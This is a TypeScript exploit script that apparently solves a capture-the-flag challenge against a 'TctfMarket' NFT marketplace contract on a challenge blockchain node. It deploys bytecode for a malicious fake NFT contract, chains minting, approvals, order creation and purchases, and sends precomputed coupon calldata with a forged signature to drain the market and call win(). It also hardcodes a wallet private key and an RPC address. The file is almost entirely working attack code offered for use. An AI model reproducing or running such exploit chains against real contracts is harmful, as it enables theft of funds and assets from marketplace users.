import { BigNumber, ethers } from "ethers"
import { NonceManager } from "@ethersproject/experimental"
import TctfMarketAbi from "./TctfMarket.json";
import FakeNFTAbi from "./FakeNFT.json";
import TctfTokenAbi from "./TctfToken.json";
import TctfNFTAbi from "./TctfNFT.json";

let byteCode =  "0x6080604052600060065560006007553480156200001b57600080fd5b506040518060400160405280600781526020016611985ad953919560ca1b815250604051806040016040528060048152602001631193919560e21b81525081600090816200006a91906200020e565b5060016200007982826200020e565b50505062000090303360016200009660201b60201c565b620002da565b816001600160a01b0316836001600160a01b031603620000fc5760405162461bcd60e51b815260206004820152601960248201527f4552433732313a20617070726f766520746f2063616c6c657200000000000000604482015260640160405180910390fd5b6001600160a01b03838116600081815260056020908152604080832094871680845294825291829020805460ff191686151590811790915591519182527f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31910160405180910390a3505050565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806200019457607f821691505b602082108103620001b557634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156200020957600081815260208120601f850160051c81016020861015620001e45750805b601f850160051c820191505b818110156200020557828155600101620001f0565b5050505b505050565b81516001600160401b038111156200022a576200022a62000169565b62000242816200023b84546200017f565b84620001bb565b602080601f8311600181146200027a5760008415620002615750858301515b600019600386901b1c1916600185901b17855562000205565b600085815260208120601f198616915b82811015620002ab578886015182559484019460019091019084016200028a565b5085821015620002ca5787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b61137f80620002ea6000396000f3fe608060405234801561001057600080fd5b50600436106100f55760003560e01c806342842e0e11610097578063a22cb46511610066578063a22cb46514610228578063b88d4fde1461023b578063c87b56dd1461024e578063e985e9c51461026157600080fd5b806342842e0e146101d95780636352211e146101ec57806370a08231146101ff57806395d89b411461022057600080fd5b8063095ea7b3116100d3578063095ea7b31461016257806312203d791461017757806323b872dd146101b357806340c10f19146101c657600080fd5b806301ffc9a7146100fa57806306fdde0314610122578063081812fc14610137575b600080fd5b61010d610108366004610edd565b61029d565b60405190151581526020015b60405180910390f35b61012a6102ef565b6040516101199190610f52565b61014a610145366004610f65565b610381565b6040516001600160a01b039091168152602001610119565b610175610170366004610f9a565b6103a8565b005b610175610185366004610fc4565b600880546001600160a01b039384166001600160a01b03199182161790915560098054929093169116179055565b6101756101c1366004610ff7565b6103fd565b6101756101d4366004610f9a565b610437565b6101756101e7366004610ff7565b505050565b61014a6101fa366004610f65565b610445565b61021261020d366004611033565b6104a5565b604051908152602001610119565b61012a61052b565b61017561023636600461104e565b61053a565b6101756102493660046110a0565b610545565b61012a61025c366004610f65565b61057d565b61010d61026f366004610fc4565b6001600160a01b03918216600090815260056020908152604080832093909416825291909152205460ff1690565b60006001600160e01b031982166380ac58cd60e01b14806102ce57506001600160e01b03198216635b5e139f60e01b145b806102e957506301ffc9a760e01b6001600160e01b03198316145b92915050565b6060600080546102fe9061117c565b80601f016020809104026020016040519081016040528092919081815260200182805461032a9061117c565b80156103775780601f1061034c57610100808354040283529160200191610377565b820191906000526020600020905b81548152906001019060200180831161035a57829003601f168201915b5050505050905090565b600061038c826105f1565b506000908152600460205260409020546001600160a01b031690565b6007546000036103d7576103d233738626f6940e2eb28930efb4cef49b2d1f2c9c11996001610653565b6103e1565b6103e1828261066e565b6001600760008282546103f491906111b6565b90915550505050565b610407338261077e565b61042c5760405162461bcd60e51b8152600401610423906111dc565b60405180910390fd5b6101e78383836107fd565b6104418282610961565b5050565b6000818152600260205260408120546001600160a01b0316806102e95760405162461bcd60e51b8152602060048201526018602482015277115490cdcc8c4e881a5b9d985b1a59081d1bdad95b88125160421b6044820152606401610423565b60006001600160a01b03821661050f5760405162461bcd60e51b815260206004820152602960248201527f4552433732313a2061646472657373207a65726f206973206e6f7420612076616044820152683634b21037bbb732b960b91b6064820152608401610423565b506001600160a01b031660009081526003602052604090205490565b6060600180546102fe9061117c565b610441338383610aec565b61054f338361077e565b61056b5760405162461bcd60e51b8152600401610423906111dc565b61057784848484610bba565b50505050565b6060610588826105f1565b600061059f60408051602081019091526000815290565b905060008151116105bf57604051806020016040528060008152506105ea565b806105c984610bed565b6040516020016105da929190611229565b6040516020818303038152906040525b9392505050565b6000818152600260205260409020546001600160a01b03166106505760405162461bcd60e51b8152602060048201526018602482015277115490cdcc8c4e881a5b9d985b1a59081d1bdad95b88125160421b6044820152606401610423565b50565b6101e783838360405180602001604052806000815250610545565b600061067982610445565b9050806001600160a01b0316836001600160a01b0316036106e65760405162461bcd60e51b815260206004820152602160248201527f4552433732313a20617070726f76616c20746f2063757272656e74206f776e656044820152603960f91b6064820152608401610423565b336001600160a01b03821614806107025750610702813361026f565b6107745760405162461bcd60e51b815260206004820152603d60248201527f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60448201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c0000006064820152608401610423565b6101e78383610c80565b60008061078a83610445565b9050806001600160a01b0316846001600160a01b031614806107d157506001600160a01b0380821660009081526005602090815260408083209388168352929052205460ff165b806107f55750836001600160a01b03166107ea84610381565b6001600160a01b0316145b949350505050565b826001600160a01b031661081082610445565b6001600160a01b0316146108365760405162461bcd60e51b815260040161042390611258565b6001600160a01b0382166108985760405162461bcd60e51b8152602060048201526024808201527f4552433732313a207472616e7366657220746f20746865207a65726f206164646044820152637265737360e01b6064820152608401610423565b826001600160a01b03166108ab82610445565b6001600160a01b0316146108d15760405162461bcd60e51b815260040161042390611258565b600081815260046020908152604080832080546001600160a01b03199081169091556001600160a01b0387811680865260038552838620805460001901905590871680865283862080546001019055868652600290945282852080549092168417909155905184937fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef91a4505050565b6001600160a01b0382166109b75760405162461bcd60e51b815260206004820181905260248201527f4552433732313a206d696e7420746f20746865207a65726f20616464726573736044820152606401610423565b6000818152600260205260409020546001600160a01b031615610a1c5760405162461bcd60e51b815260206004820152601c60248201527f4552433732313a20746f6b656e20616c7265616479206d696e746564000000006044820152606401610423565b6000818152600260205260409020546001600160a01b031615610a815760405162461bcd60e51b815260206004820152601c60248201527f4552433732313a20746f6b656e20616c7265616479206d696e746564000000006044820152606401610423565b6001600160a01b038216600081815260036020908152604080832080546001019055848352600290915280822080546001600160a01b0319168417905551839291907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef908290a45050565b816001600160a01b0316836001600160a01b031603610b4d5760405162461bcd60e51b815260206004820152601960248201527f4552433732313a20617070726f766520746f2063616c6c6572000000000000006044820152606401610423565b6001600160a01b03838116600081815260056020908152604080832094871680845294825291829020805460ff191686151590811790915591519182527f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31910160405180910390a3505050565b610bc58484846107fd565b610bd184848484610cee565b6105775760405162461bcd60e51b81526004016104239061129d565b60606000610bfa83610def565b600101905060008167ffffffffffffffff811115610c1a57610c1a61108a565b6040519080825280601f01601f191660200182016040528015610c44576020820181803683370190505b5090508181016020015b600019016f181899199a1a9b1b9c1cb0b131b232b360811b600a86061a8153600a8504945084610c4e57509392505050565b600081815260046020526040902080546001600160a01b0319166001600160a01b0384169081179091558190610cb582610445565b6001600160a01b03167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b60006001600160a01b0384163b15610de457604051630a85bd0160e11b81526001600160a01b0385169063150b7a0290610d329033908990889088906004016112ef565b6020604051808303816000875af1925050508015610d6d575060408051601f3d908101601f19168201909252610d6a9181019061132c565b60015b610dca573d808015610d9b576040519150601f19603f3d011682016040523d82523d6000602084013e610da0565b606091505b508051600003610dc25760405162461bcd60e51b81526004016104239061129d565b805181602001fd5b6001600160e01b031916630a85bd0160e11b1490506107f5565b506001949350505050565b60008072184f03e93ff9f4daa797ed6e38ed64bf6a1f0160401b8310610e2e5772184f03e93ff9f4daa797ed6e38ed64bf6a1f0160401b830492506040015b6d04ee2d6d415b85acef81000000008310610e5a576d04ee2d6d415b85acef8100000000830492506020015b662386f26fc100008310610e7857662386f26fc10000830492506010015b6305f5e1008310610e90576305f5e100830492506008015b6127108310610ea457612710830492506004015b60648310610eb6576064830492506002015b600a83106102e95760010192915050565b6001600160e01b03198116811461065057600080fd5b600060208284031215610eef57600080fd5b81356105ea81610ec7565b60005b83811015610f15578181015183820152602001610efd565b838111156105775750506000910152565b60008151808452610f3e816020860160208601610efa565b601f01601f19169290920160200192915050565b6020815260006105ea6020830184610f26565b600060208284031215610f7757600080fd5b5035919050565b80356001600160a01b0381168114610f9557600080fd5b919050565b60008060408385031215610fad57600080fd5b610fb683610f7e565b946020939093013593505050565b60008060408385031215610fd757600080fd5b610fe083610f7e565b9150610fee60208401610f7e565b90509250929050565b60008060006060848603121561100c57600080fd5b61101584610f7e565b925061102360208501610f7e565b9150604084013590509250925092565b60006020828403121561104557600080fd5b6105ea82610f7e565b6000806040838503121561106157600080fd5b61106a83610f7e565b91506020830135801515811461107f57600080fd5b809150509250929050565b634e487b7160e01b600052604160045260246000fd5b600080600080608085870312156110b657600080fd5b6110bf85610f7e565b93506110cd60208601610f7e565b925060408501359150606085013567ffffffffffffffff808211156110f157600080fd5b818701915087601f83011261110557600080fd5b8135818111156111175761111761108a565b604051601f8201601f19908116603f0116810190838211818310171561113f5761113f61108a565b816040528281528a602084870101111561115857600080fd5b82602086016020830137600060208483010152809550505050505092959194509250565b600181811c9082168061119057607f821691505b6020821081036111b057634e487b7160e01b600052602260045260246000fd5b50919050565b600082198211156111d757634e487b7160e01b600052601160045260246000fd5b500190565b6020808252602d908201527f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560408201526c1c881bdc88185c1c1c9bdd9959609a1b606082015260800190565b6000835161123b818460208801610efa565b83519083019061124f818360208801610efa565b01949350505050565b60208082526025908201527f4552433732313a207472616e736665722066726f6d20696e636f72726563742060408201526437bbb732b960d91b606082015260800190565b60208082526032908201527f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560408201527131b2b4bb32b91034b6b83632b6b2b73a32b960711b606082015260800190565b6001600160a01b038581168252841660208201526040810183905260806060820181905260009061132290830184610f26565b9695505050505050565b60006020828403121561133e57600080fd5b81516105ea81610ec756fea264697066735822122047999f854a4906af0432736e6a8c516c2121d334b436c5e02ec6318b5f14ba3b64736f6c634300080f0033";
 
let myAddress = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";
let privateKey = "0xdf57089febbacf7ba0bc227dafbffa9fc08a93fdc68e1e42411a14efcf23656e";

let provider = new ethers.providers.JsonRpcProvider("http://47.102.40.39:8545");
let signer = new NonceManager(new ethers.Wallet(privateKey, provider));

let TctfMarket = "0x245EA69fa134Fe58dCD8187A6EFEA04e287Ac1C8";
let TctfToken = "0xf5f1A6dC8F3d35E96516cFeC0D936E6B19B8D5DF";
let TctfNFT = "0x6E3aeEaFD31ed2DEae6E7c7f7baBBe85A48eAdad";
let FakeNFT = "0xc2469d565a2dc77f4a496ff5e3b25ed69ea8ab6b";

let TctfMarketContract = new ethers.Contract(TctfMarket, TctfMarketAbi, signer);
let TctfTokenContract = new ethers.Contract(TctfToken, TctfTokenAbi, signer);
let TctfNFTContract = new ethers.Contract(TctfNFT, TctfNFTAbi, signer);
let FakeNFTContract = new ethers.Contract(FakeNFT, FakeNFTAbi, signer);

var stnonce = 0;

let FakeNFTInterface = new ethers.utils.Interface(FakeNFTAbi);
let TctfMarketInterface = new ethers.utils.Interface(TctfMarketAbi);
let TctfTokenInterface = new ethers.utils.Interface(TctfTokenAbi);

let sendTx = "eth_sendRawTransaction";
let getRec = "eth_getTransactionReceipt";

function delay(ms: number) {
    return new Promise( resolve => setTimeout(resolve, ms) );
}

async function sendTransaction(calldata: string, toAddress: string) {
    let signed = await signer.signTransaction({
        from: myAddress, 
        to: toAddress,
        gasLimit: BigNumber.from(4000000),
        data: calldata, 
        nonce: stnonce, 
        chainId: 21014
    });
    stnonce += 1;
    let txhash = await provider.send(sendTx, [signed]);
    console.log(txhash);
    await delay(20000);
    let res = await provider.send(getRec, [txhash]);
    console.log(res);
    if(res.status == "0x0") {
        throw Error();
    }
}

async function deployFakeNFT() {
    console.log("deploying FakeNFT");

    let signed = await signer.signTransaction({
        from: myAddress,
        gasLimit: BigNumber.from(4000000),
        data: byteCode, 
        nonce: stnonce,
        chainId: 21014
    });

    stnonce += 1;

    let txhash = await provider.send(sendTx, [signed]);
    console.log(txhash);

    await delay(20000);

    let res = await provider.send(getRec, [txhash]);
    console.log("contract address", res.contractAddress);
}


async function getTokenAirdrop() {
    var calldata = TctfTokenInterface.encodeFunctionData("airdrop");
    console.log("getting airdrop");
    await sendTransaction(calldata, TctfToken);
}

async function mintFakeNFT(address: string, id: BigNumber) {
    var calldata = FakeNFTInterface.encodeFunctionData("mint", [address, id]);
    console.log("minting fake nft");
    await sendTransaction(calldata, FakeNFT);
}

async function doPurchaseTest(address: string, id: BigNumber, price: BigNumber) {
    var calldata = TctfMarketInterface.encodeFunctionData("purchaseTest", [address, id, price]);
    console.log("purchase test");
    await sendTransaction(calldata, TctfMarket);
}

async function TokenApprove(address: string, amount: BigNumber) {
    var calldata = TctfTokenInterface.encodeFunctionData("approve", [address, amount]);
    console.log("token approve");
    await sendTransaction(calldata, TctfToken);
}

async function FakeNFTApprove(address: string, id: BigNumber) {
    var calldata = FakeNFTInterface.encodeFunctionData("approve", [address, id]);
    console.log("fake nft approve");
    await sendTransaction(calldata, FakeNFT);
}

async function CreateOrder(address: string, id: BigNumber, price: BigNumber) {
    var calldata = TctfMarketInterface.encodeFunctionData("createOrder", [address, id, price]);
    console.log("create order");
    await sendTransaction(calldata, TctfMarket);
}

async function PurchaseOrder(id: BigNumber) {
    var calldata = TctfMarketInterface.encodeFunctionData("purchaseOrder", [id]);
    console.log("purchase order");
    await sendTransaction(calldata, TctfMarket);
}

async function PurchaseWithCoupon() {
    console.log("coupon, precomputed stuff");
    await sendTransaction("0xb40da94800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001ba3a9b25d05c428b24069063a6e37ebe693e760165483ec2bf74447dc55844c9c7b67ad2f6ea7156b04faf85e793a35d2dbf41cf317f24d10041575f45c5bb02a000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000008626f6940e2eb28930efb4cef49b2d1f2c9c11990000000000000000000000008626f6940e2eb28930efb4cef49b2d1f2c9c119900000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000007726b6d3039353900000000000000000000000000000000000000000000000000", TctfMarket);
}

async function Victory() {
    var calldata = TctfMarketInterface.encodeFunctionData("win");
    console.log("and we win!");
    await sendTransaction(calldata, TctfMarket);
}

async function main() {
    console.log("token", await TctfMarketContract.tctfToken());
    console.log("nft", await TctfMarketContract.tctfNFT());  
    stnonce = await provider.getTransactionCount(myAddress);
    console.log(stnonce);
    console.log("chainID", await provider.getNetwork()); // 21014

    // await deployFakeNFT(); // run at first
    
    await getTokenAirdrop();

    await mintFakeNFT(TctfMarket, BigNumber.from(1));
    
    await doPurchaseTest(FakeNFT, BigNumber.from(1), BigNumber.from(1337));

    await TokenApprove(TctfMarket, BigNumber.from(1342));

    await mintFakeNFT(myAddress, BigNumber.from(2));

    await FakeNFTApprove(FakeNFT, BigNumber.from(2));

    await CreateOrder(FakeNFT, BigNumber.from(2), BigNumber.from(1));

    await PurchaseOrder(BigNumber.from(0));

    await PurchaseOrder(BigNumber.from(1));

    await mintFakeNFT(myAddress, BigNumber.from(3));

    await CreateOrder(FakeNFT, BigNumber.from(3), BigNumber.from(1));

    await PurchaseWithCoupon();

    await Victory();   
}

async function checker() {
    console.log(await provider.getTransactionCount(myAddress));
    console.log(await TctfTokenContract.balanceOf(myAddress));
    console.log(await TctfNFTContract.ownerOf(1));
    console.log(await TctfNFTContract.ownerOf(2));
    console.log(await TctfNFTContract.ownerOf(3));
}

// checker()
main()
